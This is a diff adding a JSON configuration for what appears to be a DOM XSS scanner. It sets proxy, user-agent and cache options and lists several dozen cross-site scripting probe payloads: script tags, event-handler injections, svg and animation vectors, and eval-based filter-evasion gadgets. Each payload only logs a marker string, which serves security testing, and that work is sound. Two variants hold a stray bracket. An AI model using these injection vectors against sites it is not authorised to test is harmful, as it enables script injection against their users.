@@ -1,0 +1,65 @@
+{
+    "ProxyPort" : 19300,
+    "ShowBrowser" : false,
+    "CheckSubUrls" : true,
+    "UserAgent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Cachedom-XSS-scanner",
+    "CacheMode" : {"Case" : "StripArgValues" },
+    "WaitAfterNavigation" : 50,
+    "Payloads" : [
+        { "Msg": "1233321", "Payload" : "console.log(1233321)" },
+        { "Msg": "1233321", "Payload" : ";console.log(1233321);" },
+        { "Msg": "qweqwe", "Payload" : "console.log(\"qweqwe\")" },
+        { "Msg": "qweqwe", "Payload" : ";console.log('qweqwe');" },
+        { "Msg": "qweqwe", "Payload" : ";console.log(\"qweqwe\");" },
+        { "Msg": "qweqwe", "Payload" : "<script>console.log('qweqwe')</script>" },
+        { "Msg": "qweqwe", "Payload" : "<script>console.log(\"qweqwe\")</script>" },
+
+        { "Msg": "1233321", "Payload" : "console.log`1233321`" },
+        { "Msg": "1233321", "Payload" : ";console.log`1233321`;" },
+        { "Msg": "1233321", "Payload" : "<script>console.log`1233321`</script>" },
+
+        { "Msg": "1233321", "Payload" : "<iframe src=\"data:text/html,<img src=1 onerror=console.log(1233321)>\">" },
+        { "Msg": "1233321", "Payload" : "var{a:onerror}={a:console.log};throw 1233321" },
+        { "Msg": "1233321", "Payload" : ";var{a:onerror}={a:console.log};throw 1233321;" },
+        { "Msg": "1233321", "Payload" : "<script>var{a:onerror}={a:console.log};throw 1233321</script>" },
+
+        { "Msg": "1233321", "Payload" : "'console.log\\x281233321\\x29'instanceof{[Symbol['hasInstance']]:eval}" },
+        { "Msg": "1233321", "Payload" : "<script>'console.log\\x281233321\\x29'instanceof{[Symbol['hasInstance']]:eval}</script>" },
+        { "Msg": "1233321", "Payload" : "'console.log\\x281233321\\x29'instanceof{[Symbol.hasInstance]]:eval}" },
+        { "Msg": "1233321", "Payload" : "<script>'console.log\\x281233321\\x29'instanceof{[Symbol.hasInstance]]:eval}</script>" },
+
+        { "Msg": "1233321", "Payload" : "style=\"transition:outline 1s\" ontransitionend=console.log(1233321) "},
+
+        { "Msg": "1233321", "Payload" : "onload=console.log(1233321)" },
+        { "Msg": "1233321", "Payload" : "src/onerror=console.log(1233321)" },
+        { "Msg": "1233321", "Payload" : "onmessage=console.log(1233321)" },
+        { "Msg": "1233321", "Payload" : "onpageshow=console.log(1233321)" },
+        { "Msg": "1233321", "Payload" : "onpopstate=console.log(1233321)" },
+        { "Msg": "1233321", "Payload" : "onbegin=console.log(1233321)" },
+
+        { "Msg": "1233321", "Payload" : "onerror=console.log(1233321)" },
+        { "Msg": "1233321", "Payload" : "onerror=console.log`1233321`" },
+        { "Msg": "1233321", "Payload" : "src=x onerror=console.log(1233321) />" },
+        { "Msg": "1233321", "Payload" : "src=x onerror=console.log`1233321` />" },
+        { "Msg": "1233321", "Payload" : "<img src=x onerror=console.log(1233321) />" },
+        { "Msg": "1233321", "Payload" : "<img src=x onerror=console.log`1233321` />" },
+
+        { "Msg": "1233321", "Payload" : "onload=console.log(1233321) " },
+        { "Msg": "1233321", "Payload" : "src/onerror=console.log(1233321) " },
+        { "Msg": "1233321", "Payload" : "onmessage=console.log(1233321) " },
+        { "Msg": "1233321", "Payload" : "onpageshow=console.log(1233321) " },
+        { "Msg": "1233321", "Payload" : "onpopstate=console.log(1233321) " },
+        { "Msg": "1233321", "Payload" : "onbegin=console.log(1233321) " },
+
+        { "Msg": "1233321", "Payload" : "<svg onload=console.log(1233321)" },
+        { "Msg": "1233321", "Payload" : "<svg onload=console.log(1233321)<!--" },
+        { "Msg": "1233321", "Payload" : "<style>@keyframes x{}</style><xss style=animation-name:x onanimationstart=console.log(1233321)></xss>" },
+        { "Msg": "1233321", "Payload" : "<svg><animate onbegin=console.log(1233321) attributeName=x dur=1s>" },
+
+        { "Msg": "1233321", "Payload" : "<audio src/onerror=console.log(1233321)>" },
+        { "Msg": "1233321", "Payload" : "<body onload=console.log(1233321)>" },
+        { "Msg": "1233321", "Payload" : "<body onmessage=console.log(1233321)>" },
+        { "Msg": "1233321", "Payload" : "<body onpageshow=console.log(1233321)>" },
+        { "Msg": "1233321", "Payload" : "<body onpopstate=console.log(1233321)>" }
+    ]
+}
